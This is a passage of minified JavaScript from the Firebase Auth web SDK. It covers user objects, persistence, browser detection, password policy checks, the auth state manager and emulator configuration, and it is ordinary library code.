 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Aa(t,e){qe(typeof t=="string"||typeof t>"u","internal-error",{appName:e})}class yr{constructor(e){var{uid:n,auth:i,stsTokenManager:s}=e,o=V_(e,["uid","auth","stsTokenManager"]);this.providerId="firebase",this.proactiveRefresh=new Jj(this),this.reloadUserInfo=null,this.reloadListener=null,this.uid=n,this.auth=i,this.stsTokenManager=s,this.accessToken=s.accessToken,this.displayName=o.displayName||null,this.email=o.email||null,this.emailVerified=o.emailVerified||!1,this.phoneNumber=o.phoneNumber||null,this.photoURL=o.photoURL||null,this.isAnonymous=o.isAnonymous||!1,this.tenantId=o.tenantId||null,this.providerData=o.providerData?[...o.providerData]:[],this.metadata=new ev(o.createdAt||void 0,o.lastLoginAt||void 0)}async getIdToken(e){const n=await Cd(this,this.stsTokenManager.getToken(this.auth,e));return qe(n,this.auth,"internal-error"),this.accessToken!==n&&(this.accessToken=n,await this.auth._persistUserIfCurrent(this),this.auth._notifyListenersIfCurrent(this)),n}getIdTokenResult(e){return Xj(this,e)}reload(){return eL(this)}_assign(e){this!==e&&(qe(this.uid===e.uid,this.auth,"internal-error"),this.displayName=e.displayName,this.photoURL=e.photoURL,this.email=e.email,this.emailVerified=e.emailVerified,this.phoneNumber=e.phoneNumber,this.isAnonymous=e.isAnonymous,this.tenantId=e.tenantId,this.providerData=e.providerData.map(n=>Object.assign({},n)),this.metadata._copy(e.metadata),this.stsTokenManager._assign(e.stsTokenManager))}_clone(e){const n=new yr(Object.assign(Object.assign({},this),{auth:e,stsTokenManager:this.stsTokenManager._clone()}));return n.metadata._copy(this.metadata),n}_onReload(e){qe(!this.reloadListener,this.auth,"internal-error"),this.reloadListener=e,this.reloadUserInfo&&(this._notifyReloadListener(this.reloadUserInfo),this.reloadUserInfo=null)}_notifyReloadListener(e){this.reloadListener?this.reloadListener(e):this.reloadUserInfo=e}_startProactiveRefresh(){this.proactiveRefresh._start()}_stopProactiveRefresh(){this.proactiveRefresh._stop()}async _updateTokensIfNecessary(e,n=!1){let i=!1;e.idToken&&e.idToken!==this.stsTokenManager.accessToken&&(this.stsTokenManager.updateFromServerResponse(e),i=!0),n&&await Rm(this),await this.auth._persistUserIfCurrent(this),i&&this.auth._notifyListenersIfCurrent(this)}async delete(){if(rr(this.auth.app))return Promise.reject(Uo(this.auth));const e=await this.getIdToken();return await Cd(this,$j(this.auth,{idToken:e})),this.stsTokenManager.clearRefreshToken(),this.auth.signOut()}toJSON(){return Object.assign(Object.assign({uid:this.uid,email:this.email||void 0,emailVerified:this.emailVerified,displayName:this.displayName||void 0,isAnonymous:this.isAnonymous,photoURL:this.photoURL||void 0,phoneNumber:this.phoneNumber||void 0,tenantId:this.tenantId||void 0,providerData:this.providerData.map(e=>Object.assign({},e)),stsTokenManager:this.stsTokenManager.toJSON(),_redirectEventId:this._redirectEventId},this.metadata.toJSON()),{apiKey:this.auth.config.apiKey,appName:this.auth.name})}get refreshToken(){return this.stsTokenManager.refreshToken||""}static _fromJSON(e,n){var i,s,o,c,d,f,p,v;const b=(i=n.displayName)!==null&&i!==void 0?i:void 0,w=(s=n.email)!==null&&s!==void 0?s:void 0,E=(o=n.phoneNumber)!==null&&o!==void 0?o:void 0,C=(c=n.photoURL)!==null&&c!==void 0?c:void 0,M=(d=n.tenantId)!==null&&d!==void 0?d:void 0,V=(f=n._redirectEventId)!==null&&f!==void 0?f:void 0,B=(p=n.createdAt)!==null&&p!==void 0?p:void 0,Y=(v=n.lastLoginAt)!==null&&v!==void 0?v:void 0,{uid:D,emailVerified:Q,isAnonymous:G,providerData:L,stsTokenManager:N}=n;qe(D&&N,e,"internal-error");const T=ic.fromJSON(this.name,N);qe(typeof D=="string",e,"internal-error"),Aa(b,e.name),Aa(w,e.name),qe(typeof Q=="boolean",e,"internal-error"),qe(typeof G=="boolean",e,"internal-error"),Aa(E,e.name),Aa(C,e.name),Aa(M,e.name),Aa(V,e.name),Aa(B,e.name),Aa(Y,e.name);const k=new yr({uid:D,auth:e,email:w,emailVerified:Q,displayName:b,isAnonymous:G,photoURL:C,phoneNumber:E,tenantId:M,stsTokenManager:T,createdAt:B,lastLoginAt:Y});return L&&Array.isArray(L)&&(k.providerData=L.map(I=>Object.assign({},I))),V&&(k._redirectEventId=V),k}static async _fromIdTokenResponse(e,n,i=!1){const s=new ic;s.updateFromServerResponse(n);const o=new yr({uid:n.localId,auth:e,stsTokenManager:s,isAnonymous:i});return await Rm(o),o}static async _fromGetAccountInfoResponse(e,n,i){const s=n.users[0];qe(s.localId!==void 0,"internal-error");const o=s.providerUserInfo!==void 0?T4(s.providerUserInfo):[],c=!(s.email&&s.passwordHash)&&!(o!=null&&o.length),d=new ic;d.updateFromIdToken(i);const f=new yr({uid:s.localId,auth:e,stsTokenManager:d,isAnonymous:c}),p={uid:s.localId,displayName:s.displayName||null,photoURL:s.photoUrl||null,email:s.email||null,emailVerified:s.emailVerified||!1,phoneNumber:s.phoneNumber||null,tenantId:s.tenantId||null,providerData:o,metadata:new ev(s.createdAt,s.lastLoginAt),isAnonymous:!(s.email&&s.passwordHash)&&!(o!=null&&o.length)};return Object.assign(f,p),f}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ZA=new Map;function Ds(t){Fs(t instanceof Function,"Expected a class definition");let e=ZA.get(t);return e?(Fs(e instanceof t,"Instance stored in cache mismatched with class"),e):(e=new t,ZA.set(t,e),e)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class C4{constructor(){this.type="NONE",this.storage={}}async _isAvailable(){return!0}async _set(e,n){this.storage[e]=n}async _get(e){const n=this.storage[e];return n===void 0?null:n}async _remove(e){delete this.storage[e]}_addListener(e,n){}_removeListener(e,n){}}C4.type="NONE";const JA=C4;/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function qf(t,e,n){return`firebase:${t}:${e}:${n}`}class rc{constructor(e,n,i){this.persistence=e,this.auth=n,this.userKey=i;const{config:s,name:o}=this.auth;this.fullUserKey=qf(this.userKey,s.apiKey,o),this.fullPersistenceKey=qf("persistence",s.apiKey,o),this.boundEventHandler=n._onStorageEvent.bind(n),this.persistence._addListener(this.fullUserKey,this.boundEventHandler)}setCurrentUser(e){return this.persistence._set(this.fullUserKey,e.toJSON())}async getCurrentUser(){const e=await this.persistence._get(this.fullUserKey);if(!e)return null;if(typeof e=="string"){const n=await Nm(this.auth,{idToken:e}).catch(()=>{});return n?yr._fromGetAccountInfoResponse(this.auth,n,e):null}return yr._fromJSON(this.auth,e)}removeCurrentUser(){return this.persistence._remove(this.fullUserKey)}savePersistenceForRedirect(){return this.persistence._set(this.fullPersistenceKey,this.persistence.type)}async setPersistence(e){if(this.persistence===e)return;const n=await this.getCurrentUser();if(await this.removeCurrentUser(),this.persistence=e,n)return this.setCurrentUser(n)}delete(){this.persistence._removeListener(this.fullUserKey,this.boundEventHandler)}static async create(e,n,i="authUser"){if(!n.length)return new rc(Ds(JA),e,i);const s=(await Promise.all(n.map(async p=>{if(await p._isAvailable())return p}))).filter(p=>p);let o=s[0]||Ds(JA);const c=qf(i,e.config.apiKey,e.name);let d=null;for(const p of n)try{const v=await p._get(c);if(v){let b;if(typeof v=="string"){const w=await Nm(e,{idToken:v}).catch(()=>{});if(!w)break;b=await yr._fromGetAccountInfoResponse(e,w,v)}else b=yr._fromJSON(e,v);p!==o&&(d=b),o=p;break}}catch{}const f=s.filter(p=>p._shouldAllowMigration);return!o._shouldAllowMigration||!f.length?new rc(o,e,i):(o=f[0],d&&await o._set(c,d.toJSON()),await Promise.all(n.map(async p=>{if(p!==o)try{await p._remove(c)}catch{}})),new rc(o,e,i))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function eE(t){const e=t.toLowerCase();if(e.includes("opera/")||e.includes("opr/")||e.includes("opios/"))return"Opera";if(I4(e))return"IEMobile";if(e.includes("msie")||e.includes("trident/"))return"IE";if(e.includes("edge/"))return"Edge";if(S4(e))return"Firefox";if(e.includes("silk/"))return"Silk";if(D4(e))return"Blackberry";if(M4(e))return"Webos";if(N4(e))return"Safari";if((e.includes("chrome/")||R4(e))&&!e.includes("edge/"))return"Chrome";if(k4(e))return"Android";{const n=/([a-zA-Z\d\.]+)\/[a-zA-Z\d\.]*$/,i=t.match(n);if((i==null?void 0:i.length)===2)return i[1]}return"Other"}function S4(t=Xn()){return/firefox\//i.test(t)}function N4(t=Xn()){const e=t.toLowerCase();return e.includes("safari/")&&!e.includes("chrome/")&&!e.includes("crios/")&&!e.includes("android")}function R4(t=Xn()){return/crios\//i.test(t)}function I4(t=Xn()){return/iemobile/i.test(t)}function k4(t=Xn()){return/android/i.test(t)}function D4(t=Xn()){return/blackberry/i.test(t)}function M4(t=Xn()){return/webos/i.test(t)}function q_(t=Xn()){return/iphone|ipad|ipod/i.test(t)||/macintosh/i.test(t)&&/mobile/i.test(t)}function rL(t=Xn()){var e;return q_(t)&&!!(!((e=window.navigator)===null||e===void 0)&&e.standalone)}function sL(){return iO()&&document.documentMode===10}function O4(t=Xn()){return q_(t)||k4(t)||M4(t)||D4(t)||/windows phone/i.test(t)||I4(t)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function P4(t,e=[]){let n;switch(t){case"Browser":n=eE(Xn());break;case"Worker":n=`${eE(Xn())}-${t}`;break;default:n=t}const i=e.length?e.join(","):"FirebaseCore-web";return`${n}/JsCore/${tl}/${i}`}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class aL{constructor(e){this.auth=e,this.queue=[]}pushCallback(e,n){const i=o=>new Promise((c,d)=>{try{const f=e(o);c(f)}catch(f){d(f)}});i.onAbort=n,this.queue.push(i);const s=this.queue.length-1;return()=>{this.queue[s]=()=>Promise.resolve()}}async runMiddleware(e){if(this.auth.currentUser===e)return;const n=[];try{for(const i of this.queue)await i(e),i.onAbort&&n.push(i.onAbort)}catch(i){n.reverse();for(const s of n)try{s()}catch{}throw this.auth._errorFactory.create("login-blocked",{originalMessage:i==null?void 0:i.message})}}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function oL(t,e={}){return Bc(t,"GET","/v2/passwordPolicy",F_(t,e))}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const lL=6;class cL{constructor(e){var n,i,s,o;const c=e.customStrengthOptions;this.customStrengthOptions={},this.customStrengthOptions.minPasswordLength=(n=c.minPasswordLength)!==null&&n!==void 0?n:lL,c.maxPasswordLength&&(this.customStrengthOptions.maxPasswordLength=c.maxPasswordLength),c.containsLowercaseCharacter!==void 0&&(this.customStrengthOptions.containsLowercaseLetter=c.containsLowercaseCharacter),c.containsUppercaseCharacter!==void 0&&(this.customStrengthOptions.containsUppercaseLetter=c.containsUppercaseCharacter),c.containsNumericCharacter!==void 0&&(this.customStrengthOptions.containsNumericCharacter=c.containsNumericCharacter),c.containsNonAlphanumericCharacter!==void 0&&(this.customStrengthOptions.containsNonAlphanumericCharacter=c.containsNonAlphanumericCharacter),this.enforcementState=e.enforcementState,this.enforcementState==="ENFORCEMENT_STATE_UNSPECIFIED"&&(this.enforcementState="OFF"),this.allowedNonAlphanumericCharacters=(s=(i=e.allowedNonAlphanumericCharacters)===null||i===void 0?void 0:i.join(""))!==null&&s!==void 0?s:"",this.forceUpgradeOnSignin=(o=e.forceUpgradeOnSignin)!==null&&o!==void 0?o:!1,this.schemaVersion=e.schemaVersion}validatePassword(e){var n,i,s,o,c,d;const f={isValid:!0,passwordPolicy:this};return this.validatePasswordLengthOptions(e,f),this.validatePasswordCharacterOptions(e,f),f.isValid&&(f.isValid=(n=f.meetsMinPasswordLength)!==null&&n!==void 0?n:!0),f.isValid&&(f.isValid=(i=f.meetsMaxPasswordLength)!==null&&i!==void 0?i:!0),f.isValid&&(f.isValid=(s=f.containsLowercaseLetter)!==null&&s!==void 0?s:!0),f.isValid&&(f.isValid=(o=f.containsUppercaseLetter)!==null&&o!==void 0?o:!0),f.isValid&&(f.isValid=(c=f.containsNumericCharacter)!==null&&c!==void 0?c:!0),f.isValid&&(f.isValid=(d=f.containsNonAlphanumericCharacter)!==null&&d!==void 0?d:!0),f}validatePasswordLengthOptions(e,n){const i=this.customStrengthOptions.minPasswordLength,s=this.customStrengthOptions.maxPasswordLength;i&&(n.meetsMinPasswordLength=e.length>=i),s&&(n.meetsMaxPasswordLength=e.length<=s)}validatePasswordCharacterOptions(e,n){this.updatePasswordCharacterOptionsStatuses(n,!1,!1,!1,!1);let i;for(let s=0;s<e.length;s++)i=e.charAt(s),this.updatePasswordCharacterOptionsStatuses(n,i>="a"&&i<="z",i>="A"&&i<="Z",i>="0"&&i<="9",this.allowedNonAlphanumericCharacters.includes(i))}updatePasswordCharacterOptionsStatuses(e,n,i,s,o){this.customStrengthOptions.containsLowercaseLetter&&(e.containsLowercaseLetter||(e.containsLowercaseLetter=n)),this.customStrengthOptions.containsUppercaseLetter&&(e.containsUppercaseLetter||(e.containsUppercaseLetter=i)),this.customStrengthOptions.containsNumericCharacter&&(e.containsNumericCharacter||(e.containsNumericCharacter=s)),this.customStrengthOptions.containsNonAlphanumericCharacter&&(e.containsNonAlphanumericCharacter||(e.containsNonAlphanumericCharacter=o))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class uL{constructor(e,n,i,s){this.app=e,this.heartbeatServiceProvider=n,this.appCheckServiceProvider=i,this.config=s,this.currentUser=null,this.emulatorConfig=null,this.operations=Promise.resolve(),this.authStateSubscription=new tE(this),this.idTokenSubscription=new tE(this),this.beforeStateQueue=new aL(this),this.redirectUser=null,this.isProactiveRefreshEnabled=!1,this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION=1,this._canInitEmulator=!0,this._isInitialized=!1,this._deleted=!1,this._initializationPromise=null,this._popupRedirectResolver=null,this._errorFactory=b4,this._agentRecaptchaConfig=null,this._tenantRecaptchaConfigs={},this._projectPasswordPolicy=null,this._tenantPasswordPolicies={},this._resolvePersistenceManagerAvailable=void 0,this.lastNotifiedUid=void 0,this.languageCode=null,this.tenantId=null,this.settings={appVerificationDisabledForTesting:!1},this.frameworks=[],this.name=e.name,this.clientVersion=s.sdkClientVersion,this._persistenceManagerAvailable=new Promise(o=>this._resolvePersistenceManagerAvailable=o)}_initializeWithPersistence(e,n){return n&&(this._popupRedirectResolver=Ds(n)),this._initializationPromise=this.queue(async()=>{var i,s,o;if(!this._deleted&&(this.persistenceManager=await rc.create(this,e),(i=this._resolvePersistenceManagerAvailable)===null||i===void 0||i.call(this),!this._deleted)){if(!((s=this._popupRedirectResolver)===null||s===void 0)&&s._shouldInitProactively)try{await this._popupRedirectResolver._initialize(this)}catch{}await this.initializeCurrentUser(n),this.lastNotifiedUid=((o=this.currentUser)===null||o===void 0?void 0:o.uid)||null,!this._deleted&&(this._isInitialized=!0)}}),this._initializationPromise}async _onStorageEvent(){if(this._deleted)return;const e=await this.assertedPersistence.getCurrentUser();if(!(!this.currentUser&&!e)){if(this.currentUser&&e&&this.currentUser.uid===e.uid){this._currentUser._assign(e),await this.currentUser.getIdToken();return}await this._updateCurrentUser(e,!0)}}async initializeCurrentUserFromIdToken(e){try{const n=await Nm(this,{idToken:e}),i=await yr._fromGetAccountInfoResponse(this,n,e);await this.directlySetCurrentUser(i)}catch(n){console.warn("FirebaseServerApp could not login user with provided authIdToken: ",n),await this.directlySetCurrentUser(null)}}async initializeCurrentUser(e){var n;if(rr(this.app)){const c=this.app.settings.authIdToken;return c?new Promise(d=>{setTimeout(()=>this.initializeCurrentUserFromIdToken(c).then(d,d))}):this.directlySetCurrentUser(null)}const i=await this.assertedPersistence.getCurrentUser();let s=i,o=!1;if(e&&this.config.authDomain){await this.getOrInitRedirectPersistenceManager();const c=(n=this.redirectUser)===null||n===void 0?void 0:n._redirectEventId,d=s==null?void 0:s._redirectEventId,f=await this.tryRedirectSignIn(e);(!c||c===d)&&(f!=null&&f.user)&&(s=f.user,o=!0)}if(!s)return this.directlySetCurrentUser(null);if(!s._redirectEventId){if(o)try{await this.beforeStateQueue.runMiddleware(s)}catch(c){s=i,this._popupRedirectResolver._overrideRedirectResult(this,()=>Promise.reject(c))}return s?this.reloadAndSetCurrentUserOrClear(s):this.directlySetCurrentUser(null)}return qe(this._popupRedirectResolver,this,"argument-error"),await this.getOrInitRedirectPersistenceManager(),this.redirectUser&&this.redirectUser._redirectEventId===s._redirectEventId?this.directlySetCurrentUser(s):this.reloadAndSetCurrentUserOrClear(s)}async tryRedirectSignIn(e){let n=null;try{n=await this._popupRedirectResolver._completeRedirectFn(this,e,!0)}catch{await this._setRedirectUser(null)}return n}async reloadAndSetCurrentUserOrClear(e){try{await Rm(e)}catch(n){if((n==null?void 0:n.code)!=="auth/network-request-failed")return this.directlySetCurrentUser(null)}return this.directlySetCurrentUser(e)}useDeviceLanguage(){this.languageCode=qj()}async _delete(){this._deleted=!0}async updateCurrentUser(e){if(rr(this.app))return Promise.reject(Uo(this));const n=e?tn(e):null;return n&&qe(n.auth.config.apiKey===this.config.apiKey,this,"invalid-user-token"),this._updateCurrentUser(n&&n._clone(this))}async _updateCurrentUser(e,n=!1){if(!this._deleted)return e&&qe(this.tenantId===e.tenantId,this,"tenant-id-mismatch"),n||await this.beforeStateQueue.runMiddleware(e),this.queue(async()=>{await this.directlySetCurrentUser(e),this.notifyAuthListeners()})}async signOut(){return rr(this.app)?Promise.reject(Uo(this)):(await this.beforeStateQueue.runMiddleware(null),(this.redirectPersistenceManager||this._popupRedirectResolver)&&await this._setRedirectUser(null),this._updateCurrentUser(null,!0))}setPersistence(e){return rr(this.app)?Promise.reject(Uo(this)):this.queue(async()=>{await this.assertedPersistence.setPersistence(Ds(e))})}_getRecaptchaConfig(){return this.tenantId==null?this._agentRecaptchaConfig:this._tenantRecaptchaConfigs[this.tenantId]}async validatePassword(e){this._getPasswordPolicyInternal()||await this._updatePasswordPolicy();const n=this._getPasswordPolicyInternal();return n.schemaVersion!==this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION?Promise.reject(this._errorFactory.create("unsupported-password-policy-schema-version",{})):n.validatePassword(e)}_getPasswordPolicyInternal(){return this.tenantId===null?this._projectPasswordPolicy:this._tenantPasswordPolicies[this.tenantId]}async _updatePasswordPolicy(){const e=await oL(this),n=new cL(e);this.tenantId===null?this._projectPasswordPolicy=n:this._tenantPasswordPolicies[this.tenantId]=n}_getPersistenceType(){return this.assertedPersistence.persistence.type}_getPersistence(){return this.assertedPersistence.persistence}_updateErrorMap(e){this._errorFactory=new qd("auth","Firebase",e())}onAuthStateChanged(e,n,i){return this.registerStateListener(this.authStateSubscription,e,n,i)}beforeAuthStateChanged(e,n){return this.beforeStateQueue.pushCallback(e,n)}onIdTokenChanged(e,n,i){return this.registerStateListener(this.idTokenSubscription,e,n,i)}authStateReady(){return new Promise((e,n)=>{if(this.currentUser)e();else{const i=this.onAuthStateChanged(()=>{i(),e()},n)}})}async revokeAccessToken(e){if(this.currentUser){const n=await this.currentUser.getIdToken(),i={providerId:"apple.com",tokenType:"ACCESS_TOKEN",token:e,idToken:n};this.tenantId!=null&&(i.tenantId=this.tenantId),await iL(this,i)}}toJSON(){var e;return{apiKey:this.config.apiKey,authDomain:this.config.authDomain,appName:this.name,currentUser:(e=this._currentUser)===null||e===void 0?void 0:e.toJSON()}}async _setRedirectUser(e,n){const i=await this.getOrInitRedirectPersistenceManager(n);return e===null?i.removeCurrentUser():i.setCurrentUser(e)}async getOrInitRedirectPersistenceManager(e){if(!this.redirectPersistenceManager){const n=e&&Ds(e)||this._popupRedirectResolver;qe(n,this,"argument-error"),this.redirectPersistenceManager=await rc.create(this,[Ds(n._redirectPersistence)],"redirectUser"),this.redirectUser=await this.redirectPersistenceManager.getCurrentUser()}return this.redirectPersistenceManager}async _redirectUserForId(e){var n,i;return this._isInitialized&&await this.queue(async()=>{}),((n=this._currentUser)===null||n===void 0?void 0:n._redirectEventId)===e?this._currentUser:((i=this.redirectUser)===null||i===void 0?void 0:i._redirectEventId)===e?this.redirectUser:null}async _persistUserIfCurrent(e){if(e===this.currentUser)return this.queue(async()=>this.directlySetCurrentUser(e))}_notifyListenersIfCurrent(e){e===this.currentUser&&this.notifyAuthListeners()}_key(){return`${this.config.authDomain}:${this.config.apiKey}:${this.name}`}_startProactiveRefresh(){this.isProactiveRefreshEnabled=!0,this.currentUser&&this._currentUser._startProactiveRefresh()}_stopProactiveRefresh(){this.isProactiveRefreshEnabled=!1,this.currentUser&&this._currentUser._stopProactiveRefresh()}get _currentUser(){return this.currentUser}notifyAuthListeners(){var e,n;if(!this._isInitialized)return;this.idTokenSubscription.next(this.currentUser);const i=(n=(e=this.currentUser)===null||e===void 0?void 0:e.uid)!==null&&n!==void 0?n:null;this.lastNotifiedUid!==i&&(this.lastNotifiedUid=i,this.authStateSubscription.next(this.currentUser))}registerStateListener(e,n,i,s){if(this._deleted)return()=>{};const o=typeof n=="function"?n:n.next.bind(n);let c=!1;const d=this._isInitialized?Promise.resolve():this._initializationPromise;if(qe(d,this,"internal-error"),d.then(()=>{c||o(this.currentUser)}),typeof n=="function"){const f=e.addObserver(n,i,s);return()=>{c=!0,f()}}else{const f=e.addObserver(n);return()=>{c=!0,f()}}}async directlySetCurrentUser(e){this.currentUser&&this.currentUser!==e&&this._currentUser._stopProactiveRefresh(),e&&this.isProactiveRefreshEnabled&&e._startProactiveRefresh(),this.currentUser=e,e?await this.assertedPersistence.setCurrentUser(e):await this.assertedPersistence.removeCurrentUser()}queue(e){return this.operations=this.operations.then(e,e),this.operations}get assertedPersistence(){return qe(this.persistenceManager,this,"internal-error"),this.persistenceManager}_logFramework(e){!e||this.frameworks.includes(e)||(this.frameworks.push(e),this.frameworks.sort(),this.clientVersion=P4(this.config.clientPlatform,this._getFrameworks()))}_getFrameworks(){return this.frameworks}async _getAdditionalHeaders(){var e;const n={"X-Client-Version":this.clientVersion};this.app.options.appId&&(n["X-Firebase-gmpid"]=this.app.options.appId);const i=await((e=this.heartbeatServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getHeartbeatsHeader());i&&(n["X-Firebase-Client"]=i);const s=await this._getAppCheckToken();return s&&(n["X-Firebase-AppCheck"]=s),n}async _getAppCheckToken(){var e;if(rr(this.app)&&this.app.settings.appCheckToken)return this.app.settings.appCheckToken;const n=await((e=this.appCheckServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getToken());return n!=null&&n.error&&Bj(`Error while retrieving App Check token: ${n.error}`),n==null?void 0:n.token}}function Tp(t){return tn(t)}class tE{constructor(e){this.auth=e,this.observer=null,this.addObserver=mO(n=>this.observer=n)}get next(){return qe(this.observer,this.auth,"internal-error"),this.observer.next.bind(this.observer)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let G_={async loadJS(){throw new Error("Unable to load external scripts")},recaptchaV2Script:"",recaptchaEnterpriseScript:"",gapiScript:""};function dL(t){G_=t}function hL(t){return G_.loadJS(t)}function fL(){return G_.gapiScript}function mL(t){return`__${t}${Math.floor(Math.random()*1e6)}`}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function pL(t,e){const n=rp(t,"auth");if(n.isInitialized()){const s=n.getImmediate(),o=n.getOptions();if(Ba(o,e??{}))return s;ts(s,"already-initialized")}return n.initialize({options:e})}function gL(t,e){const n=(e==null?void 0:e.persistence)||[],i=(Array.isArray(n)?n:[n]).map(Ds);e!=null&&e.errorMap&&t._updateErrorMap(e.errorMap),t._initializeWithPersistence(i,e==null?void 0:e.popupRedirectResolver)}function yL(t,e,n){const i=Tp(t);qe(/^https?:\/\//.test(e),i,"invalid-emulator-scheme");const s=!1,o=j4(e),{host:c,port:d}=vL(e),f=d===null?"":`:${d}`,p={url:`${o}//${c}${f}/`},v=Object.freeze({host:c,port:d,protocol:o.replace(":",""),options:Object.freeze({disableWarnings:s})});if(!i._canInitEmulator){qe(i.config.emulator&&i.emulatorConfig,i,"emulator-config-failed"),qe(Ba(p,i.config.emulator)&&Ba(v,i.emulatorConfig),i,"emulator-config-failed");return}i.config.emulator=p,i.emulatorConfig=v,i.settings.appVerificationDisabledForTesting=!0,el(c)?(Wv(`${o}//${c}${f}`),$v("Auth",!0)):_L()}function j4(t){const e=t.indexOf(":");return e<0?"":t.substr(0,e+1)}function vL(t){const e=j4(t),n=/(\/\/)?([^?#/]+)/.exec(t.substr(e.length));if(!n)return{host:"",port:null};const i=n[2].split("@").pop()||"",s=/^(\[[^\]]+\])(:|$)/.exec(i);if(s){const o=s[1];return{host:o,port:nE(i.substr(o.length+1))}}else{const[o,c]=i.split(":");return{host:o,port:nE(c)}}}function nE(t){if(!t)return null;const e=Number(t);return isNaN(e)?null:e}function _L(){function t(){const e=document.createElement("p"),n=e.style;e.innerText="Running in emulator mode. Do not use with production credentials.",n.position="fixed",n.width="100%",n.backgroundColor="#ffffff",n.border=".1em solid #000000",n.color="#b50000",n.bottom="0px",n.left="0px",n.margin="0px",n.zIndex="10000",n.textAlign="center",e.classList.add("firebase-emulator-warning"),document.body.appendChild(e)}typeof console<"u"&&typeof console.info=="function"&&console.info("WARNING: You are using the Auth Emulator, which is intended for local testing only.  Do not use with production 